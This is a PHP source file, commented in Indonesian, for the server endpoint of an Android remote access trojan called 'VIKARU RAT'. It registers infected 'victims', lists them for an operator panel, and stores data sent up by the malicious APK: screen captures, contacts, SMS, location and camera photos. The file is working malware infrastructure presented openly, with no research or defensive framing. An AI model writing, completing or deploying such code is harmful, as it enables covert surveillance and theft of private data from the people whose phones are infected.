<?php
/**
 * VIKARU RAT - Victim Endpoint
 * Method: GET (list victims) | POST (register + kirim data)
 */

require_once __DIR__ . '/../config.php';

// === GET: List all victims (Panel) ===
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    requireAuth();

    $result = mysqli_query($conn, "SELECT * FROM victims ORDER BY last_online DESC");

    $victims = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $victims[] = [
            'id'              => $row['id'],
            'model'           => $row['model'],
            'android_version' => $row['android_version'],
            'ip_address'      => $row['ip_address'],
            'last_online'     => $row['last_online'],
            'status'          => $row['status']
        ];
    }

    echo json_encode($victims);
    exit;
}

// === POST: Register victim / kirim data dari APK ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $victim_id = sanitize($conn, $_POST['id'] ?? '');
    $model     = sanitize($conn, $_POST['model'] ?? 'Unknown');
    $version   = sanitize($conn, $_POST['android_version'] ?? 'Unknown');
    $ip        = $_SERVER['REMOTE_ADDR'];

    // Jika tidak ada ID, tolak
    if (empty($victim_id)) {
        http_response_code(400);
        echo json_encode(['error' => 'missing_id', 'message' => 'Parameter id wajib diisi']);
        exit;
    }

    // Insert / Update victim
    $sql = "INSERT INTO victims (id, model, android_version, ip_address, status, last_online) 
            VALUES ('$victim_id', '$model', '$version', '$ip', 'online', NOW())
            ON DUPLICATE KEY UPDATE 
                model = VALUES(model),
                android_version = VALUES(android_version),
                ip_address = VALUES(ip_address),
                status = 'online',
                last_online = NOW()";

    mysqli_query($conn, $sql);

    // Simpan log (screen capture, kontak, sms, lokasi, dll)
    if (!empty($_POST['log_type']) && !empty($_POST['log_data'])) {
        $logType = sanitize($conn, $_POST['log_type']);
        $logData = sanitize($conn, $_POST['log_data']);

        $sqlLog = "INSERT INTO logs (victim_id, type, data) 
                   VALUES ('$victim_id', '$logType', '$logData')";
        mysqli_query($conn, $sqlLog);
    }

    // Simpan file (foto kamera, dll dalam base64)
    if (!empty($_POST['file_type']) && !empty($_POST['file_data'])) {
        $fileType = sanitize($conn, $_POST['file_type']);
        $fileName = sanitize($conn, $_POST['file_name'] ?? 'captured_file');
        $fileData = sanitize($conn, $_POST['file_data']);

        $sqlFile = "INSERT INTO files (victim_id, file_type, file_name, file_data) 
                    VALUES ('$victim_id', '$fileType', '$fileName', '$fileData')";
        mysqli_query($conn, $sqlFile);
    }

    echo json_encode([
        'status'  => 'success',
        'message' => 'Data diterima',
        'victim'  => $victim_id
    ]);
    exit;
}

// Method tidak diizinkan
http_response_code(405);
echo json_encode(['error' => 'method_not_allowed']);
?>
